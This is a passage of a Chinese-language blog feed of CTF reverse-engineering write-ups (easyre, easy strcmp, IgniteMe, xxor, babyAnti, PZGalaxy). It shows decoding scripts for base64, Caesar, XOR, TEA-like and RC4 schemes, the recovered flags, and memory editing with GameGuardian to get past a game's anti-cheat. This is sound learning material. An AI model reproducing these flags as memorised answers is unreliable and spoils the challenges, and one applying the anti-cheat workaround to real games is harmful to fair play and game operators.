      <title>reverse-[羊城杯 2020]easyre</title>
      <link href="/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/"/>
      <url>/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="情景再现"><a href="#情景再现" class="headerlink" title="情景再现"></a>情景再现</h1><p>先查壳</p><p><img src="/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/image-20230221183532771.png" alt="image-20230221183532771"></p><p>然后X64dbg运行一下看看 顺便看看字符串</p><p><img src="/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/image-20230221183609612.png" alt="image-20230221183609612"></p><p>看到了base64的特征  (难道真就base64这么easy——re嘛)</p><p>拖入ida64分析一下</p><p><img src="/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/image-20230221183724792.png" alt="image-20230221183724792"></p><p>一看 哦 原来有是个加密call</p><p>第一个  就是正常base64加密</p><p><img src="/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/image-20230221184105851.png" alt="image-20230221184105851"></p><p>（不确定的话可以动调  试一试）</p><p><img src="/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/image-20230221184803512.png" alt="image-20230221184803512"></p><p><img src="/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/image-20230221184914649.png" alt="image-20230221184914649"></p><p>第二个 仔细看看  是重新排序了一下字符串</p><p>13个为一组(刚好密文52个字符  正好4组)</p><p><img src="/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/image-20230221184003308.png" alt="image-20230221184003308"></p><p>第三个call  是Caesar加密</p><p>当然可以直接逆算法写  很好写的</p><p><img src="/2023/02/21/reverse-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre/image-20230221185008781.png" alt="image-20230221185008781"></p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">encData = <span class="string">'EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG'</span></span><br><span class="line">encData1 = <span class="string">''</span></span><br><span class="line"><span class="comment"># caesar 加密</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encData:</span><br><span class="line">    <span class="keyword">if</span> <span class="number">47</span> &lt; <span class="built_in">ord</span>(i) &lt;= <span class="number">57</span>:</span><br><span class="line">        encData1 += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">48</span> - <span class="number">3</span>) % <span class="number">10</span> + <span class="number">48</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">96</span> &lt; <span class="built_in">ord</span>(i) &lt;= <span class="number">122</span>:</span><br><span class="line">        encData1 += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">97</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">64</span> &lt; <span class="built_in">ord</span>(i) &lt;= <span class="number">90</span>:</span><br><span class="line">        encData1 += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">65</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        encData1 += i</span><br><span class="line"><span class="built_in">print</span>(encData1)</span><br><span class="line"><span class="comment"># 每13个一组换位置</span></span><br><span class="line">flag = encData1[<span class="number">13</span>:<span class="number">26</span>] + encData1[<span class="number">39</span>:] + encData1[:<span class="number">13</span>] + encData1[<span class="number">26</span>:<span class="number">39</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># base64 加密</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment">#GWHT{672cc4778a38e80cb362987341133ea2}</span></span><br></pre></td></tr></tbody></table></figure><p><code>flag{672cc4778a38e80cb362987341133ea2}</code></p><p>提交一下   过啦</p><p>Orz</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><hr><p><strong>今天你 RE 了嘛</strong></p><hr><p>这道题确实easy</p><p>没啥好说的 </p><p>() Orz</p><p>好的  本期结束  感谢观看</p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>reverse-[Zer0pts2020]easy strcmp</title>
      <link href="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/"/>
      <url>/2023/02/20/reverse-Zer0pts2020-easy-strcmp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来写了好几个的（都挺简单的）但是上传失败了</p><p>好烦  就没再搞 然后的话又因为今天要期末考试</p><p>所以就找一篇我觉得有用的上传吧</p><p>Orz</p><h1 id="Zer0pts2020-easy-strcmp"><a href="#Zer0pts2020-easy-strcmp" class="headerlink" title="[Zer0pts2020]easy strcmp"></a>[Zer0pts2020]easy strcmp</h1><p>这题  挺新颖的  </p><p>打开是个Linux的压缩包  放到虚拟机解压</p><p>拖出来 查壳</p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220170209187.png" alt="image-20230220170209187"></p><p>然后运行一下</p><p>回显看不懂   </p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220170238075.png" alt="image-20230220170238075"></p><p>拖入ida64分析</p><p>奇怪了 啥也没调用</p><p>怎么整 不慌 随便翻翻看看</p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220170414375.png" alt="image-20230220170414375"></p><p>翻一下左面函数栏</p><p><strong>其实没有这么麻烦  了解函数调用的约定就能知道</strong></p><p><strong>为什么先调用init了</strong> –<code>由右向左传入</code></p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220170747797.png" alt="image-20230220170747797"></p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220170555956.png" alt="image-20230220170555956"></p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220170613038.png" alt="image-20230220170613038"></p><p>发现先调用的init函数</p><p>跟进去看看</p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220170829173.png" alt="image-20230220170829173"></p><p>这几个函数都看看  然后跟如889 发现了两个call</p><p>都看一下 发现795有用</p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220170852538.png" alt="image-20230220170852538"></p><p>跟如795</p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220170931557.png" alt="image-20230220170931557"></p><p>然后看到这个是 strcmp call</p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220171020993.png" alt="image-20230220171020993"></p><p>这样就知道了 strcmp调用了6EA这个函数</p><p>那这个就是关键call了</p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220171250693.png" alt="image-20230220171250693"></p><p>跟入6EA</p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220171411920.png" alt="image-20230220171411920"></p><p>然后 应该就了解怎么回事了吧</p><p><img src="/2023/02/20/reverse-Zer0pts2020-easy-strcmp/image-20230220171450636.png" alt="image-20230220171450636"></p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">cipher = <span class="string">'zer0pts{********CENSORED********}'</span></span><br><span class="line"></span><br><span class="line">encData = [<span class="number">0</span>, <span class="number">0x410A4335494A0942</span>, <span class="number">0x0B0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b""</span>  <span class="comment"># 由于是字节操作，需要在前面加上b</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    p = cipher[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>]  <span class="comment"># 将cipher字符串8位一组分开</span></span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    a = binascii.b2a_hex(p.encode(<span class="string">'ascii'</span>)[::-<span class="number">1</span>])  <span class="comment"># 将分开后的字符串转每一位转换成ascii，然后逆序</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    b = binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(a, <span class="number">16</span>) + encData[i])[<span class="number">2</span>:])[::-<span class="number">1</span>]  <span class="comment"># （cipher[i]的ascii+encData[i]）的结果是16进制，[2::]是舍弃开头的0x，然后[::-1]逆序</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    flag += b  <span class="comment"># 拼凑每组还原后的结果</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># zer0pts{l3ts_m4k3_4_DETOUR_t0d4y}</span></span><br></pre></td></tr></tbody></table></figure><p><code>flag{l3ts_m4k3_4_DETOUR_t0d4y}</code></p><p>提交一下  过辣</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题挺难的  我学到了很多东西</p><p>哈哈哈  记录一下</p><p>然后  就没然后了 </p><p>哥们去准备期末考试了</p><p>好烦  晚上就要考 还有3个小时</p><p>好的  本题结束 感谢观看</p><p>Orz</p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>reverse-buuctf刷题记录1</title>
      <link href="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="FlareOn4-IgniteMe"><a href="#FlareOn4-IgniteMe" class="headerlink" title="[FlareOn4]IgniteMe"></a>[FlareOn4]IgniteMe</h1><p>查壳</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219152315192.png" alt="image-20230219152315192"></p><p>拖入ollydbg运行一下程序 顺便看字符串</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219152525182.png" alt="image-20230219152525182"></p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219152443500.png" alt="image-20230219152443500"></p><p>没啥特别的  拖入ida分析</p><p>看字符串 跟踪主函数</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219152601262.png" alt="image-20230219152601262"></p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219152941661.png" alt="image-20230219152941661"></p><p>跟入4010F0 - 去除\n  \r这俩字符</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219152845320.png" alt="image-20230219152845320"></p><p>跟入401050</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219153045091.png" alt="image-20230219153045091"></p><p>这个里面就是密文倒过来  ^  v5</p><p>然后v5不知道值  跟入401000</p><p>看不懂  我去动调了一下  得到v5 = 4</p><p>动调的话 找到401000这个call运行就知道啦</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219154648453.png" alt="image-20230219154648453"></p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">encData = [<span class="number">0x0D</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x17</span>, <span class="number">0x78</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x6C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x45</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x44</span>,</span><br><span class="line">           <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x56</span>, <span class="number">0x09</span>, <span class="number">0x5F</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x48</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>,</span><br><span class="line">           <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x69</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">arr1 = []</span><br><span class="line">v4 = <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encData)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    arr1.append(encData[i] ^ v4)</span><br><span class="line">    v4 = arr1[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">''</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> arr1[::-<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com</span></span><br></pre></td></tr></tbody></table></figure><p><code>flag{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com}</code></p><p>提交 过辣</p><p>好的 本题结束 Orz</p><h1 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h1><p>查壳</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219165050212.png" alt="image-20230219165050212"></p><p>运行一下  并没有什么有用的东西</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219165139708.png" alt="image-20230219165139708"></p><p>拖入ida64分析</p><p>跟入主函数</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219165314281.png" alt="image-20230219165314281"></p><p>跟踪400770</p><p>发现是个方程 用z3库解出所有值</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219165428261.png" alt="image-20230219165428261"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a1,a2,a3,a4,a5,a6=Ints(<span class="string">'a1 a2 a3 a4 a5 a6'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(a3 - a4 == <span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(a4 + a5 == <span class="number">0xFA6CB703</span>)</span><br><span class="line">s.add(a3 - a5 == <span class="number">0x42D731A8</span>)</span><br><span class="line">s.add(a1 == <span class="number">0xDF48EF7E</span>)</span><br><span class="line">s.add(a6 == <span class="number">0x84F30420</span>)</span><br><span class="line">s.add(a2 == <span class="number">0x20CAACF4</span>)</span><br><span class="line"><span class="keyword">if</span>(s.check() == sat):</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"></span><br><span class="line"><span class="comment">#[a3 = 3774025685,</span></span><br><span class="line"> a2 = <span class="number">550153460</span>,</span><br><span class="line"> a6 = <span class="number">2230518816</span>,</span><br><span class="line"> a1 = <span class="number">3746099070</span>,</span><br><span class="line"> a4 = <span class="number">1548802262</span>,</span><br><span class="line"> a5 = <span class="number">2652626477</span>]</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>回去看下另一个call</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219165554127.png" alt="image-20230219165554127"></p><p>逻辑也不难 逆回去就好了</p><p><img src="/2023/02/19/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20230219165621010.png" alt="image-20230219165621010"></p><p>贴exp</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    __int64 a[<span class="number">6</span>] = { <span class="number">3746099070</span>, <span class="number">550153460</span>, <span class="number">3774025685</span>, <span class="number">1548802262</span>, <span class="number">2652626477</span>, <span class="number">2230518816</span> };</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> a2[<span class="number">4</span>] = { <span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> };</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v3, v4;</span><br><span class="line">    <span class="type">int</span> v5;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; j += <span class="number">2</span>) {</span><br><span class="line">        v3 = a[j];</span><br><span class="line">        v4 = a[j + <span class="number">1</span>];</span><br><span class="line">        v5 = <span class="number">1166789954</span> * <span class="number">0x40</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0x3F</span>; ++i) {</span><br><span class="line">            v4 -= (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + a2[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">            v3 -= (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + *a2) ^ ((v4 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">            v5 -= <span class="number">1166789954</span>;</span><br><span class="line">        }</span><br><span class="line">        a[j] = v3;</span><br><span class="line">        a[j + <span class="number">1</span>] = v4;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*将整型数组作为字符输出，注意计算机小端排序*/</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) </span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//cout &lt;&lt; a[i] &lt;&lt; endl;</span></span><br><span class="line">        cout &lt;&lt; *((<span class="type">char</span>*)&amp;a[i] + <span class="number">2</span>) &lt;&lt; *((<span class="type">char</span>*)&amp;a[i] + <span class="number">1</span>) &lt;&lt; *((<span class="type">char</span>*)&amp;a[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    cin.<span class="built_in">get</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta"># flag{re_is_great!}</span></span><br></pre></td></tr></tbody></table></figure><p><code>flag{re_is_great!}</code></p><p>提交  过辣</p><p>好的 本题结束</p><p>Orz</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一个不难</p><p>学到了<code>动静结合</code> </p><p>做题的时候遇见看不懂的可以动调一下</p><p>也许就明了 了 哈哈</p><p>第二道也不难(笔者用了挺长时间， 还是太菜Orz)</p><p>然后  就没然后了 笔者累了  嘿嘿</p><p>好的  本期结束 感谢观看</p><p>Orz  Orz</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2023逆向区WriteUp</title>
      <link href="/2023/02/19/reverse-VNCTF2023WriteUp/"/>
      <url>/2023/02/19/reverse-VNCTF2023WriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="babyAnti"><a href="#babyAnti" class="headerlink" title="babyAnti"></a>babyAnti</h1><p>下载附件 是个apk文件  </p><p><code>对于这类文件  都先放入模拟器运行一下看是否有切入点</code></p><p><code>然后可以使用jadx去看源代码 </code></p><p><code>或者也可以解压出来找到.so文件拖入ida进行分析</code> </p><p>打开模拟器  先运行一下(笔者是用的夜神模拟器)</p><p>如何下载去Google搜一下就好了</p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219093015720.png" alt="image-20230219093015720"></p><p>发现是个小恐龙游戏</p><p>(就是哪个没网时浏览器的哪个放松-摸鱼游戏)</p><p>然后需要3000就会给flag  看着挺简单</p><p>Setting里面没啥东西  不影响</p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219093458459.png" alt="image-20230219093458459"></p><p>然后去下载一个GG修改器</p><p>如何打过最近的RealWorldCTF体验赛的话应该就会马上找到切入点了   和哪个贪吃蛇游戏 很类似</p><p>(先说一句  比那个难点 ，可能是笔者太菜了 想了半天 )</p><p>这里笔者推荐下载GameGuardian.101.1_for_Nox_Bluestacks-GDaily.org</p><p>这个版本  适配于夜神的</p><p>找到分数的代码  发现挺多 不过类型不一样</p><p>先改改试试</p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219094111407.png" alt="image-20230219094111407"></p><p>发现  有反作弊检测 好烦 (没整过  怎么办)</p><p>大致猜测了一下  用过ce (改加密数据) 的应该能猜到的</p><p>应该是相同地址类型byte的改成0/1是反作弊的</p><p>dword qword类型的是分数</p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219094233369.png" alt="image-20230219094233369"></p><p>放到jadx去看一下 我测  找半天没找到main和cheat的代码</p><p>这个贴一下队里✌的图  ta用的jeb</p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219094646660.png" alt="image-20230219094646660"></p><p>这是jadx的图</p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219094736912.png" alt="image-20230219094736912"></p><p>然后试一下  过啦</p><p><code>flag{D1n0_Run_0ut_0f_The_F0rest_F1nally^_^}</code> </p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219104459578.png" alt="image-20230219104459578"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题（队里大佬jiao的）猜出来的</p><p>怎么说呢 算是开拓思维了</p><p>挺好的  又知道了一种题型</p><p>Orz </p><p>出官方WP我去看看到底怎么个事</p><h1 id="PZGalaxy-爆破RC4"><a href="#PZGalaxy-爆破RC4" class="headerlink" title="PZGalaxy - 爆破RC4"></a>PZGalaxy - 爆破RC4</h1><p>是个网页题</p><p>随便输一下  很明显是个error</p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219103726232.png" alt="image-20230219103726232"></p><p>F12  看一下</p><p>找到关键函数</p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219103915079.png" alt="image-20230219103915079"></p><p>发现key为8位并且前4位是2023</p><p>cipher给了出来 然后flag的前4位是“flag”</p><p>所以  很简单  暴破一下后四位key就好了</p><p>这儿去Google一个RC4解密脚本</p><p>小改一下就好了</p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">keys</span>):</span><br><span class="line">    cipher = [<span class="number">166</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">220</span>]</span><br><span class="line">    key = <span class="built_in">list</span>(keys)</span><br><span class="line">    <span class="comment"># KSA</span></span><br><span class="line">    S = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="comment"># PRGA</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    keystream = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        keystream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line">    enc = <span class="string">""</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, [(cipher[i] ^ keystream[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keystream))]))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> enc:</span><br><span class="line">        <span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">57</span>):  <span class="comment"># 48-57 ---- 0-9</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">57</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">57</span>):</span><br><span class="line">            <span class="keyword">for</span> n 